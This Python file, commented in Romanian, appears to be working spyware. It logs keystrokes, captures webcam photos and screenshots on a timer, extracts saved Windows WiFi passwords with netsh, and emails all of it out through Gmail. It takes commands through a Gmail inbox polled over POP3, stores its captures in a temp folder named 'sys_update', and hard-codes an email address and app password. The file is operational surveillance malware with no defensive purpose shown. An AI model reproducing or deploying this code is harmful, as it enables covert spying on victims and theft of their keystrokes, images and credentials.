import smtplib
import poplib
import email
import threading
import time
import os
import sys
import tempfile
import platform
import socket
import psutil
import subprocess
import re
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from pynput import keyboard
from PIL import ImageGrab
import cv2

# ====================== CONFIGURARE SMTP ======================
SMTP_CONFIG = {
    'server': 'smtp.gmail.com',
    'port': 587,
    'email': 'romanbogdan475@gmail.com',
    'password': 'cxzv ddop qosk hvdy'
}


class SystemInfoCollector:
    """Colectează informații despre sistem și parole WiFi"""

    @staticmethod
    def get_device_info():
        try:
            info = {
                'system': platform.system(),
                'hostname': platform.node(),
                'release': platform.release(),
                'version': platform.version(),
                'machine': platform.machine(),
                'processor': platform.processor(),
                'ip_address': socket.gethostbyname(socket.gethostname()),
                'ram_total': f"{psutil.virtual_memory().total / (1024**3):.2f} GB",
                'ram_available': f"{psutil.virtual_memory().available / (1024**3):.2f} GB",
                'cpu_count': psutil.cpu_count(),
                'cpu_percent': f"{psutil.cpu_percent()}%",
                'boot_time': datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S'),
            }
            return info
        except Exception as e:
            return f"Eroare device info: {str(e)}"

    @staticmethod
    def get_wifi_passwords():
        wifi_passwords = []
        if platform.system() == 'Windows':
            try:
                result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                                      capture_output=True, text=True).stdout
                profile_names = re.findall(r"All User Profile\s*:\s*(.*)", result)
                for name in profile_names:
                    try:
                        profile_result = subprocess.run(['netsh', 'wlan', 'show', 'profile', 
                                                       name.strip(), 'key=clear'], 
                                                      capture_output=True, text=True).stdout
                        password = re.search(r"Key Content\s*:\s*(.*)", profile_result)
                        if password:
                            wifi_passwords.append({'ssid': name.strip(), 'password': password.group(1)})
                    except:
                        pass
            except:
                pass
        return wifi_passwords


class Agent:
    def __init__(self):
        self.recipient_email = None
        self.info_sent = False
        
        # Intervale (modificabile dinamic din C2)
        self.key_interval = 15
        self.camera_interval = 15
        self.screenshot_interval = 15
        self.check_interval = 10

        # Control flags
        self.keylogger_running = True
        self.camera_running = True
        self.screenshot_running = True

        self.buffer = ""
        self.key_listener = None

        self.base_folder = os.path.join(tempfile.gettempdir(), "sys_update")
        self.photo_folder = os.path.join(self.base_folder, "photos")
        self.screenshot_folder = os.path.join(self.base_folder, "screenshots")
       
        os.makedirs(self.photo_folder, exist_ok=True)
        os.makedirs(self.screenshot_folder, exist_ok=True)
       
        print("[+] Agent pornit cu succes.")
        print(f"[+] Intervale inițiale → Key: {self.key_interval}s | Camera: {self.camera_interval}s | Screenshot: {self.screenshot_interval}s")

        self.start_all_modules()
        self.start_command_checker()

    def send_email(self, subject, body, attachments=None):
        if not self.recipient_email:
            print("[-] Recipient email nu este setat!")
            return False
        try:
            msg = MIMEMultipart()
            msg['From'] = SMTP_CONFIG['email']
            msg['To'] = self.recipient_email
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain'))

            if attachments:
                for file_path in attachments:
                    if os.path.exists(file_path):
                        with open(file_path, 'rb') as f:
                            if file_path.lower().endswith(('.jpg', '.png')):
                                img = MIMEImage(f.read(), name=os.path.basename(file_path))
                                msg.attach(img)

            with smtplib.SMTP(SMTP_CONFIG['server'], SMTP_CONFIG['port']) as server:
                server.starttls()
                server.login(SMTP_CONFIG['email'], SMTP_CONFIG['password'])
                server.send_message(msg)
            
            print(f"[+] Email trimis: {subject}")
            return True
        except Exception as e:
            print(f"[-] Eroare la trimitere email: {e}")
            return False

    def send_system_info(self):
        """Trimite informațiile despre sistem + parole WiFi (o singură dată)"""
        if self.info_sent or not self.recipient_email:
            return
            
        try:
            device_info = SystemInfoCollector.get_device_info()
            wifi_passwords = SystemInfoCollector.get_wifi_passwords()

            body = f"=== SYSTEM INFORMATION REPORT ===\n"
            body += f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            body += str(device_info) + "\n\n"
            body += "=== PAROLE WIFI SALVATE ===\n"
            
            if wifi_passwords:
                for wifi in wifi_passwords:
                    body += f"SSID: {wifi['ssid']} | Password: {wifi['password']}\n"
            else:
                body += "Nu s-au găsit parole WiFi.\n"

            self.send_email("SYSTEM_INFO", body)
            print("[+] Informații sistem + parole WiFi trimise cu succes!")
            self.info_sent = True

        except Exception as e:
            print(f"[-] Eroare la trimiterea info sistem: {e}")

    # ====================== KEYLOGGER ======================
    def start_keylogger(self):
        def on_press(key):
            try:
                char = key.char
            except AttributeError:
                char = f"[{str(key).replace('Key.', '')}]"
                if key == keyboard.Key.space: char = " "
                elif key == keyboard.Key.enter: char = "\n"
                elif key == keyboard.Key.backspace: char = "[BACK]"

            self.buffer += char

        self.key_listener = keyboard.Listener(on_press=on_press)
        self.key_listener.start()
        print("[+] Keylogger pornit")

    def start_keylog_sender(self):
        def loop():
            while self.keylogger_running:
                time.sleep(self.key_interval)
                if self.buffer.strip():
                    self.send_email("KEYLOG", f"Keylogger Report:\n\n{self.buffer}")
                    self.buffer = ""
        threading.Thread(target=loop, daemon=True).start()

    # ====================== CAMERA & SCREENSHOT ======================
    def start_auto_camera(self):
        def loop():
            while self.camera_running:
                try:
                    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                    ret, frame = cap.read()
                    if ret:
                        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                        path = os.path.join(self.photo_folder, f"photo_{ts}.jpg")
                        cv2.imwrite(path, frame)
                        self.send_email("PHOTO", "Poză automată", [path])
                finally:
                    if 'cap' in locals():
                        cap.release()
                time.sleep(self.camera_interval)
        threading.Thread(target=loop, daemon=True).start()

    def start_auto_screenshot(self):
        def loop():
            while self.screenshot_running:
                try:
                    screenshot = ImageGrab.grab()
                    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                    path = os.path.join(self.screenshot_folder, f"screenshot_{ts}.png")
                    screenshot.save(path)
                    self.send_email("SCREENSHOT", "Screenshot automată", [path])
                except:
                    pass
                time.sleep(self.screenshot_interval)
        threading.Thread(target=loop, daemon=True).start()

    # ====================== COMENZI ======================
    def process_command(self, command):
        try:
            if command.startswith("SET_RECIPIENT:"):
                email = command[13:].strip()
                if "@" in email:
                    self.recipient_email = email
                    print(f"[+] Recipient setat: {email}")
                    self.send_system_info()        # Trimite info sistem după setare

            elif command.startswith("SET_KEY_INTERVAL:"):
                self.key_interval = int(command.split(":")[1])
                print(f"[+] Keylogger interval → {self.key_interval}s")

            elif command.startswith("SET_CAMERA_INTERVAL:"):
                self.camera_interval = int(command.split(":")[1])
                print(f"[+] Camera interval → {self.camera_interval}s")

            elif command.startswith("SET_SCREENSHOT_INTERVAL:"):
                self.screenshot_interval = int(command.split(":")[1])
                print(f"[+] Screenshot interval → {self.screenshot_interval}s")

            elif command.startswith("SET_CHECK_INTERVAL:"):
                self.check_interval = int(command.split(":")[1])
                print(f"[+] Check interval → {self.check_interval}s")

            elif command == "START_KEYLOGGER":
                self.keylogger_running = True
            elif command == "STOP_KEYLOGGER":
                self.keylogger_running = False

        except Exception as e:
            print(f"[-] Eroare procesare comandă: {e}")

    def start_command_checker(self):
        def loop():
            while True:
                try:
                    pop_conn = poplib.POP3_SSL('pop.gmail.com', 995)
                    pop_conn.user(SMTP_CONFIG['email'])
                    pop_conn.pass_(SMTP_CONFIG['password'])
                   
                    num_messages = len(pop_conn.list()[1])
                    for i in range(max(1, num_messages - 30), num_messages + 1):
                        raw_email = b"\n".join(pop_conn.retr(i)[1])
                        msg = email.message_from_bytes(raw_email)
                        subject = msg.get('Subject', '').strip()

                        if subject.startswith('COMMAND:'):
                            command = subject[9:].strip()
                            print(f"[*] Comandă primită: {command}")
                            self.process_command(command)

                    pop_conn.quit()
                except:
                    pass
                time.sleep(self.check_interval)

        threading.Thread(target=loop, daemon=True).start()

    def start_all_modules(self):
        self.start_keylogger()
        self.start_keylog_sender()
        self.start_auto_camera()
        self.start_auto_screenshot()


if __name__ == "__main__":
    agent = Agent()
    print("Agentul rulează... Așteaptă comanda SET_RECIPIENT din C2.")
   
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Agent oprit.")
        sys.exit(0)